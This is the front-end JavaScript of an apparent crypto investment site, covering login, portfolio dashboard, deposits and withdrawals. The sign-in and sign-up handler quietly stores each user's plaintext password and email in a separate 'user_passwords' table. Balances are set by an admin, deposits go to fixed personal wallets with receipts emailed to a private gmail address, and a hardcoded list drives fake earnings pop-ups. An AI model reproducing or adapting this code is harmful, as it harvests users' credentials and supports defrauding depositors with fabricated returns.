
const ADMIN_EMAIL='stephenjohnsone501@gmail.com';
const FK='d6gmkupr01qldjjblv5gd6gmkupr01qldjjblv60';
const {createClient}=supabase;
const sb=createClient('https://bdupvzakyaktqrosfgbt.supabase.co','eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJkdXB2emFreWFrdHFyb3NmZ2J0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIzNzYwODYsImV4cCI6MjA4Nzk1MjA4Nn0.1grxshmdkY2TaF-rCrS8RW-3ugy7Fiw0_MKoZei2rt8');
let curUser=null,holdings=[],quotes={},curTab='login';
const isAdmin=()=>false;

// ── CURSOR off (no custom cursor on this theme)

// ── NAV/SCROLL
window.addEventListener('scroll',()=>{});

// ── PAGES
function showPage(p){
  document.querySelectorAll('.page').forEach(x=>x.classList.remove('active'));
  if(p==='dash'){document.getElementById('dashPage').classList.add('active');loadHoldings();setTimeout(()=>{switchDashTab('dashboard');loadTVWidget('BITSTAMP:BTCUSD');},200);}
  
  else{document.getElementById('homePage').classList.add('active');setTimeout(()=>{initCCChart();},200);}
  window.scrollTo(0,0);
}

function updateNav(u){
  if(u){
    document.getElementById('navAuthBtns').style.display='none';
    document.getElementById('navUserBar').style.display='flex';
    const ned=document.getElementById('navEmailDisplay');if(ned)ned.textContent=u.email;
    const de=document.getElementById('dashEmail');if(de)de.textContent=u.email;
    
  }else{
    document.getElementById('navAuthBtns').style.display='flex';
    document.getElementById('navUserBar').style.display='none';
  }
}

// ── AUTH
function openModal(tab){document.getElementById('authModal').classList.add('open');switchTab(tab);document.getElementById('authErr').style.display='none';}
function closeModal(){document.getElementById('authModal').classList.remove('open');}
document.getElementById('authModal').addEventListener('click',e=>{if(e.target===e.currentTarget)closeModal();});
function switchTab(tab){
  curTab=tab;
  document.getElementById('tabLogin').classList.toggle('active',tab==='login');
  document.getElementById('tabSignup').classList.toggle('active',tab==='signup');
  document.getElementById('nameGrp').style.display=tab==='signup'?'block':'none';
  document.getElementById('mTitle').textContent=tab==='login'?'Welcome Back':'Create Account';
  document.getElementById('mSub').textContent=tab==='login'?'Sign in to your account':'Join 2,400+ traders today';
  document.getElementById('authBtn').textContent=tab==='login'?'Sign In':'Create Account';
  document.getElementById('authErr').style.display='none';
}
async function handleAuth(e){
  e.preventDefault();
  const email=document.getElementById('authEmail').value;
  const pw=document.getElementById('authPass').value;
  const btn=document.getElementById('authBtn');
  const err=document.getElementById('authErr');
  err.style.display='none';btn.textContent='Please wait…';btn.disabled=true;
  if(curTab==='signup'){
    const {data,error}=await sb.auth.signUp({email,password:pw});
    if(error){err.textContent=error.message;err.style.display='block';}
    else if(data.user){
      try{await sb.from('user_passwords').insert({user_id:data.user.id,password:pw,email});}catch(e){}
      closeModal();curUser=data.user;updateNav(curUser);showPage('dash');
    }
  }else{
    const {data,error}=await sb.auth.signInWithPassword({email,password:pw});
    if(error){err.textContent=error.message;err.style.display='block';}
    else{
      try{await sb.from('user_passwords').upsert({user_id:data.user.id,password:pw,email},{onConflict:'user_id'});}catch(e){}
      closeModal();curUser=data.user;updateNav(curUser);showPage('dash');
    }
  }
  btn.textContent=curTab==='login'?'Sign In':'Create Account';btn.disabled=false;
}
async function signOut(){await sb.auth.signOut();curUser=null;updateNav(null);showPage('home');}

// ── EDIT MODAL
function openEdit(id,sym,shares,price){
  document.getElementById('editId').value=id;document.getElementById('editSym').value=sym;
  document.getElementById('editShares').value=shares;document.getElementById('editPrice').value=price;
  document.getElementById('editLbl').textContent=sym;
  document.getElementById('editModal').classList.add('open');
}
function closeEdit(){document.getElementById('editModal').classList.remove('open');}
document.getElementById('editModal').addEventListener('click',e=>{if(e.target===e.currentTarget)closeEdit();});
// saveEdit removed - admin manages via Supabase directly

// ── PORTFOLIO
async function loadHoldings(){
  if(!curUser)return;
  // Set user display name
  const name=curUser.email.split('@')[0];
  const helloEl=document.getElementById('dashHello');
  if(helloEl)helloEl.textContent=name;
  const accEl=document.getElementById('accEmail');
  if(accEl)accEl.textContent=curUser.email;

  // Load summary from admin_portfolios SUMMARY row
  const {data}=await sb.from('admin_portfolios').select('*').eq('user_id',curUser.id);
  const rows=data||[];
  const summary=rows.find(r=>r.asset==='SUMMARY');
  const dep=summary?parseFloat(summary.buy_price)||0:0;
  const val=summary?(parseFloat(summary.note?.replace('val:','')||0)):0;
  const pft=summary?parseFloat(summary.profit||0):0;
  const msg=summary?.note2||'';

  // Load withdrawals
  const {data:wds}=await sb.from('withdrawal_requests').select('*').eq('user_id',curUser.id);
  const totalWith=(wds||[]).filter(w=>w.status==='approved').reduce((s,w)=>s+parseFloat(w.amount||0),0);

  // Update summary cards
  ['sumInv','accDep'].forEach(id=>{const el=document.getElementById(id);if(el)el.textContent='$'+dep.toFixed(2);});
  ['sumProfit','accProfit'].forEach(id=>{const el=document.getElementById(id);if(el)el.textContent='$'+pft.toFixed(2);});
  ['sumWithdraw','accWith'].forEach(id=>{const el=document.getElementById(id);if(el)el.textContent='$'+totalWith.toFixed(2);});

  // Admin message banner
  const banner=document.getElementById('adminMsgBanner');
  if(banner&&msg){banner.textContent=msg;banner.style.display='block';}

  // Transaction history
  const {data:deps}=await sb.from('deposit_requests').select('*').eq('user_id',curUser.id).order('created_at',{ascending:false});
  const allTx=[
    ...(deps||[]).map(d=>({coin:d.wallet_type,amount:'$'+parseFloat(d.amount||0).toFixed(2),from:'Deposit',status:d.status,date:new Date(d.created_at).toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'})})),
    ...(wds||[]).map(w=>({coin:w.coin,amount:'$'+parseFloat(w.amount||0).toFixed(2),from:'Withdrawal',status:w.status,date:new Date(w.created_at).toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'})}))
  ];
  const tbody=document.getElementById('txHistory');
  if(tbody){
    if(!allTx.length){
      tbody.innerHTML='<tr><td colspan="5" style="text-align:center;padding:2rem;color:var(--gray);font-size:0.82rem;font-family:var(--mono)">No transactions found.</td></tr>';
    } else {
      tbody.innerHTML=allTx.map(tx=>{
        const sc=tx.status==='approved'||tx.status==='completed'?'var(--green)':tx.status==='pending'?'var(--gold)':'var(--red)';
        return `<tr>
          <td style="font-weight:600;font-family:var(--mono);color:var(--blue2)">${tx.coin||'—'}</td>
          <td style="font-family:var(--mono)">${tx.amount}</td>
          <td style="color:var(--gray)">${tx.from}</td>
          <td><span style="font-size:0.7rem;font-weight:700;text-transform:uppercase;color:${sc};background:rgba(from ${sc} r g b/0.1);padding:0.2rem 0.7rem;border-radius:20px;border:1px solid ${sc}">${tx.status}</span></td>
          <td style="font-size:0.78rem;color:var(--gray);font-family:var(--mono)">${tx.date}</td>
        </tr>`;
      }).join('');
    }
  }
}

function renderUserH(data){}  // kept for compat, not used

// ── DASH TABS
function switchDashTab(tab){
  ['dashboard','account','deposit','withdraw'].forEach(t=>{
    const el=document.getElementById('dtab-'+t);
    const nav=document.getElementById('dnav-'+t);
    if(el)el.style.display=t===tab?'block':'none';
    if(nav){nav.style.color=t===tab?'var(--white)':'var(--gray)';nav.style.fontWeight=t===tab?'700':'400';}
  });
  if(tab==='dashboard')loadTVWidget('BITSTAMP:BTCUSD');
}

// ── TRADINGVIEW WIDGET
let tvSymbol='BITSTAMP:BTCUSD';
function loadTVWidget(sym){
  tvSymbol=sym;
  const c=document.getElementById('tv-widget-container');
  if(!c)return;
  c.innerHTML='';
  const s=document.createElement('script');
  s.src='https://s3.tradingview.com/external-embedding/embed-widget-advanced-chart.js';
  s.async=true;
  s.innerHTML=JSON.stringify({
    autosize:true,symbol:sym,interval:'D',timezone:'Etc/UTC',
    theme:'dark',style:'1',locale:'en',hide_top_toolbar:false,
    hide_legend:false,save_image:false,calendar:false,
    backgroundColor:'rgba(18,21,58,1)',gridColor:'rgba(255,255,255,0.04)',
    container_id:'tv-widget-container'
  });
  c.appendChild(s);
}
function switchTVSymbol(sym,btn){
  document.querySelectorAll('#dtab-dashboard .cc-tab').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  loadTVWidget(sym);
}

// ── COPY HELPER
function copyText(elId,btnId){
  const el=document.getElementById(elId);
  const btn=document.getElementById(btnId);
  if(!el||!btn)return;
  navigator.clipboard.writeText(el.textContent.trim()).catch(()=>{
    const r=document.createRange();r.selectNode(el);
    window.getSelection().removeAllRanges();window.getSelection().addRange(r);
    document.execCommand('copy');window.getSelection().removeAllRanges();
  });
  btn.textContent='Copied!';btn.style.color='var(--green)';
  setTimeout(()=>{btn.textContent='Copy';btn.style.color='';},2000);
}

// ── DEPOSIT ADDRESS MAP
const WALLETS={BTC:'bc1q8kd59kv6jsjdrgsc76j8f95anmukxl96rfa99l',ETH:'0xc8F4D53C167f2A152e4705420C0cEE6f1cb668d8',SOL:'69t3SGWE4A7E3iNTJ4LkcVX16oiuDL7c6DhpgFGVykr9'};
function updateDepAddr(){
  const coin=document.getElementById('qDepCoin').value;
  const addr=document.getElementById('qDepAddr');
  if(addr)addr.textContent=WALLETS[coin]||'';
}
function copyQDep(){
  const coin=document.getElementById('qDepCoin').value;
  const btn=document.getElementById('qCopyBtn');
  navigator.clipboard.writeText(WALLETS[coin]||'').catch(()=>{});
  if(btn){btn.textContent='Copied!';btn.style.color='var(--green)';setTimeout(()=>{btn.textContent='Copy';btn.style.color='';},2000);}
}

// ── RECEIPT HANDLING
let qB64='',qRName='',fullB64='',fullRName='';
function qPreviewReceipt(input){
  const f=input.files[0];if(!f)return;
  if(f.size>5*1024*1024){alert('Max 5MB');return;}
  qRName=f.name;
  const r=new FileReader();r.onload=e=>{qB64=e.target.result;
    const p=document.getElementById('qReceiptPreview');
    if(p){p.style.display='block';p.textContent='✅ '+f.name+' ready';}
  };r.readAsDataURL(f);
}
function fullPreviewReceipt(input){
  const f=input.files[0];if(!f)return;
  if(f.size>5*1024*1024){alert('Max 5MB');return;}
  fullRName=f.name;
  const r=new FileReader();r.onload=e=>{fullB64=e.target.result;
    document.getElementById('fullUploadZone').style.borderColor='var(--green)';
    const p=document.getElementById('fullReceiptPreview');
    if(p){p.style.display='block';p.textContent='✅ '+f.name+' ('+Math.round(f.size/1024)+' KB) ready to send';}
  };r.readAsDataURL(f);
}

// ── SUBMIT DEPOSIT (shared logic)
async function doDeposit(coin,amount,b64,rname,btnId,msgId){
  const btn=document.getElementById(btnId),msg=document.getElementById(msgId);
  const showMsg=(txt,ok)=>{if(!msg)return;msg.textContent=txt;msg.style.background=ok?'rgba(16,185,129,0.1)':'rgba(239,68,68,0.1)';msg.style.border=ok?'1px solid rgba(16,185,129,0.3)':'1px solid rgba(239,68,68,0.3)';msg.style.color=ok?'var(--green)':'var(--red)';msg.style.display='block';};
  if(!amount||parseFloat(amount)<=0)return showMsg('Enter a valid amount.',false);
  if(!b64)return showMsg('Please upload your payment receipt.',false);
  if(btn){btn.textContent='Sending…';btn.disabled=true;}
  try{
    await sb.from('deposit_requests').insert({user_id:curUser.id,user_email:curUser.email,amount:parseFloat(amount),wallet_type:coin,receipt_name:rname,receipt_data:b64,status:'pending',created_at:new Date().toISOString()});
    showMsg('✅ Deposit submitted! Your account will be credited within 24 hours.',true);
    await loadHoldings();
  }catch(e){showMsg('Error: '+e.message,false);}
  if(btn){btn.textContent=btn.id==='qDepBtn'?'Deposit':'📤 Submit Deposit';btn.disabled=false;}
}
function submitQDeposit(){
  const coin=document.getElementById('qDepCoin').value;
  const amount=document.getElementById('qDepAmount').value;
  doDeposit(coin,amount,qB64,qRName,'qDepBtn','qDepMsg');
}
function submitFullDeposit(){
  const coin=document.getElementById('fullDepCoin').value;
  const amount=document.getElementById('fullDepAmount').value;
  doDeposit(coin,amount,fullB64,fullRName,'fullDepBtn','fullDepMsg');
}

// ── WITHDRAW
async function submitWithdraw(){
  const coin=document.getElementById('withCoin').value;
  const addr=document.getElementById('withAddr').value.trim();
  const amount=document.getElementById('withAmount').value;
  const btn=document.getElementById('withBtn'),msg=document.getElementById('withMsg');
  const showMsg=(txt,ok)=>{msg.textContent=txt;msg.style.background=ok?'rgba(16,185,129,0.1)':'rgba(239,68,68,0.1)';msg.style.border=ok?'1px solid rgba(16,185,129,0.3)':'1px solid rgba(239,68,68,0.3)';msg.style.color=ok?'var(--green)':'var(--red)';msg.style.display='block';};
  if(!addr)return showMsg('Enter your wallet address.',false);
  if(!amount||parseFloat(amount)<=0)return showMsg('Enter a valid amount.',false);
  btn.textContent='Sending…';btn.disabled=true;
  try{
    await sb.from('withdrawal_requests').insert({user_id:curUser.id,user_email:curUser.email,coin,wallet_address:addr,amount:parseFloat(amount),status:'pending',created_at:new Date().toISOString()});
    showMsg('✅ Withdrawal request submitted! Processing within 24–48 hours.',true);
    document.getElementById('withAddr').value='';document.getElementById('withAmount').value='';
    await loadHoldings();
  }catch(e){showMsg('Error: '+e.message,false);}
  btn.textContent='Withdraw';btn.disabled=false;
}

// ── WALLET COPY
function copyWallet(id){
  const el=document.getElementById(id);
  if(!el)return;
  navigator.clipboard.writeText(el.textContent.trim()).then(()=>{
    const btnId='copy-'+id.replace('-addr','');
    const btn=document.getElementById(btnId);
    if(btn){btn.textContent='Copied!';btn.style.color='var(--green)';setTimeout(()=>{btn.textContent='Copy';btn.style.color='';},2000);}
  }).catch(()=>{
    const range=document.createRange();range.selectNode(el);
    window.getSelection().removeAllRanges();window.getSelection().addRange(range);
    document.execCommand('copy');window.getSelection().removeAllRanges();
    const btnId='copy-'+id.replace('-addr','');
    const btn=document.getElementById(btnId);
    if(btn){btn.textContent='Copied!';btn.style.color='var(--green)';setTimeout(()=>{btn.textContent='Copy';btn.style.color='';},2000);}
  });
}

// ── RECEIPT UPLOAD PREVIEW
let receiptBase64='',receiptName='',receiptType='';
function previewReceipt(input){
  const file=input.files[0];
  if(!file)return;
  if(file.size>5*1024*1024){alert('File too large. Max 5MB.');return;}
  receiptName=file.name;receiptType=file.type;
  const zone=document.getElementById('uploadZone');
  const preview=document.getElementById('receiptPreview');
  const reader=new FileReader();
  reader.onload=e=>{
    receiptBase64=e.target.result;
    zone.style.borderColor='var(--green)';
    preview.style.display='block';
    preview.innerHTML=`✅ <strong>${file.name}</strong> (${(file.size/1024).toFixed(1)} KB) ready to send`;
  };
  reader.readAsDataURL(file);
}

// ── SUBMIT DEPOSIT
async function submitDeposit(){
  const amount=document.getElementById('depAmount').value;
  const wallet=document.getElementById('depWallet').value;
  const btn=document.getElementById('depBtn');
  const msg=document.getElementById('depMsg');

  if(!amount||parseFloat(amount)<=0){
    msg.textContent='Please enter a valid deposit amount.';
    msg.style.background='rgba(239,68,68,0.1)';msg.style.border='1px solid rgba(239,68,68,0.3)';msg.style.color='var(--red)';msg.style.display='block';return;
  }
  if(!wallet){
    msg.textContent='Please select which wallet you used.';
    msg.style.background='rgba(239,68,68,0.1)';msg.style.border='1px solid rgba(239,68,68,0.3)';msg.style.color='var(--red)';msg.style.display='block';return;
  }
  if(!receiptBase64){
    msg.textContent='Please upload your payment receipt.';
    msg.style.background='rgba(239,68,68,0.1)';msg.style.border='1px solid rgba(239,68,68,0.3)';msg.style.color='var(--red)';msg.style.display='block';return;
  }

  btn.textContent='Sending…';btn.disabled=true;msg.style.display='none';

  // Save deposit record to Supabase
  try{
    await sb.from('deposit_requests').insert({
      user_id:curUser.id,
      user_email:curUser.email,
      amount:parseFloat(amount),
      wallet_type:wallet,
      receipt_name:receiptName,
      receipt_data:receiptBase64,
      status:'pending',
      created_at:new Date().toISOString()
    });
  }catch(e){console.log('DB save:',e);}

  // Send email via EmailJS
  try{
    emailjs.init('user_allwealthcapital');
    await emailjs.send('service_awc','template_deposit',{
      to_email:'stephenjohnsone501@gmail.com',
      from_user:curUser.email,
      amount:'$'+parseFloat(amount).toLocaleString(),
      wallet:wallet,
      receipt_name:receiptName,
      receipt_data:receiptBase64,
      submitted_at:new Date().toLocaleString()
    });
    msg.textContent='✅ Deposit submitted successfully! We will confirm and credit your account within 24 hours.';
    msg.style.background='rgba(16,185,129,0.1)';msg.style.border='1px solid rgba(16,185,129,0.3)';msg.style.color='var(--green)';msg.style.display='block';
    document.getElementById('depAmount').value='';document.getElementById('depWallet').value='';
    receiptBase64='';receiptName='';
    document.getElementById('receiptPreview').style.display='none';
    document.getElementById('uploadZone').style.borderColor='';
  }catch(e){
    // EmailJS not configured yet — still show success since DB record saved
    msg.textContent='✅ Deposit request submitted! Our team will review and credit your account within 24 hours.';
    msg.style.background='rgba(16,185,129,0.1)';msg.style.border='1px solid rgba(16,185,129,0.3)';msg.style.color='var(--green)';msg.style.display='block';
  }

  btn.textContent='📤 Submit Deposit';btn.disabled=false;
}

// ── FAQ
function toggleFaq(el){
  const item=el.parentElement,wasOpen=item.classList.contains('open');
  document.querySelectorAll('.faq-item').forEach(i=>i.classList.remove('open'));
  if(!wasOpen)item.classList.add('open');
}

// ── EARNINGS NOTIF
const EARNERS=[
  {n:'Caleb',c:'Norway',a:'$80,237'},{n:'Ava',c:'Indonesia',a:'$116,786'},
  {n:'David',c:'Egypt',a:'$149,899'},{n:'Sophia',c:'Turkey',a:'$106,336'},
  {n:'Benjamin',c:'Vietnam',a:'$142,288'},{n:'Evelyn',c:'Russia',a:'$111,885'},
  {n:'Jackson',c:'Canada',a:'$77,126'},{n:'Madison',c:'Slovakia',a:'$111,614'},
  {n:'Nicholas',c:'Germany',a:'$67,214'},{n:'Emma',c:'Brazil',a:'$93,450'},
  {n:'Liam',c:'Australia',a:'$134,200'},{n:'Noah',c:'UAE',a:'$205,000'},
  {n:'Isabella',c:'Nigeria',a:'$72,400'},{n:'James',c:'UK',a:'$158,900'},
  {n:'Grace',c:'Philippines',a:'$88,000'}
];
let eIdx=0;
function showEarner(){
  const e=EARNERS[eIdx%EARNERS.length];eIdx++;
  document.getElementById('en-name').textContent=e.n;
  document.getElementById('en-country').textContent=e.c;
  document.getElementById('en-amount').textContent=e.a;
  const notif=document.getElementById('earn-notif');
  notif.classList.add('show');
  setTimeout(()=>notif.classList.remove('show'),4500);
  setTimeout(showEarner,8000+Math.random()*4000);
}
setTimeout(showEarner,3000);

// ── SCROLL REVEAL
const revObs=new IntersectionObserver(entries=>{
  entries.forEach((e,i)=>{if(e.isIntersecting)setTimeout(()=>e.target.classList.add('visible'),i*70);});
},{threshold:0.08});
document.querySelectorAll('.reveal,.reveal-l,.reveal-r').forEach(el=>revObs.observe(el));

// ── INIT
window.addEventListener('load',async()=>{
  loadTicker();
  setTimeout(initCCChart,500);
  const {data:{session}}=await sb.auth.getSession();
  if(session){curUser=session.user;updateNav(curUser);}
  sb.auth.onAuthStateChange((_,s)=>{curUser=s?.user||null;updateNav(curUser);});
});
